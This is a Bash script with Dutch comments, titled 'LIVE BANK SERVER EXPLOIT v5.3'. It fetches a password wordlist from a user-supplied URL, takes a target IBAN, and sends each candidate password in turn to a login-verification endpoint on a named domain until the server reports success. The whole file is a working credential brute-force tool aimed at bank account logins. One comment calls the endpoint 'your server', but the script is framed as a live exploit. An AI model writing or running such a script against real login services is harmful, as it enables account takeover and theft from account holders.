#!/bin/bash

# Kleuren
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

while true; do
    clear
    echo -e "${GREEN}======================================================"
    echo -e "          LIVE BANK SERVER EXPLOIT v5.3 (LINUX)"
    echo -e "======================================================${NC}"
    echo ""

    read -p "Plak de URL van de GitHub Wordlist (Raw): " urlList

    # Haal de lijst op en haal direct alle Windows-tekens (\r) weg
    raw_data=$(curl -s -L "$urlList" | tr -d '\r')

    if [ -z "$raw_data" ]; then
        echo -e "${RED}[FOUT] Kon lijst niet ophalen.${NC}"
        read -p "Druk op Enter..."
        continue
    fi

    read -p "Voer het doelwit IBAN in: " iban
    echo "------------------------------------------------------"

    gevonden=false

    # We gebruiken een techniek die elk woord strikt apart neemt
    while read -r line; do
        # Verwijder alle spaties aan begin/eind
        gok=$(echo "$line" | xargs)

        # Sla lege regels over
        [[ -z "$gok" ]] && continue

        echo -n "PROBEREN: '$gok' ... "

        # Verstuur naar jouw server
        # We vangen de respons op en kijken of 'success":true' erin staat
        response=$(curl -s -X POST "https://telefoon.wilste.nl/bank/verify-login" \
            -H "Content-Type: application/json" \
            -d "{\"iban\":\"$iban\", \"password\":\"$gok\"}")

        # STRENGE CONTROLE: Alleen als de server specifiek "success":true teruggeeft
        if [[ "$response" == *'"success":true'* ]] || [[ "$response" == *'"success": true'* ]]; then
            echo -e "${GREEN}[MATCH!]${NC}"
            echo -e "\n******************************************************"
            echo -e "    WACHTWOORD GEVONDEN: $gok"
            echo -e "******************************************************"
            gevonden=true
            break
        else
            echo -e "${RED}[GEWEIGERD]${NC}"
        fi

        sleep 0.1
    done <<< "$raw_data"

    if [ "$gevonden" = false ]; then
        echo -e "\n${RED}[FAIL] Geen match gevonden in de lijst.${NC}"
    fi

    echo ""
    read -p "Nieuwe ronde? (j/n): " keuze
    [[ "$keuze" != "j" ]] && break
done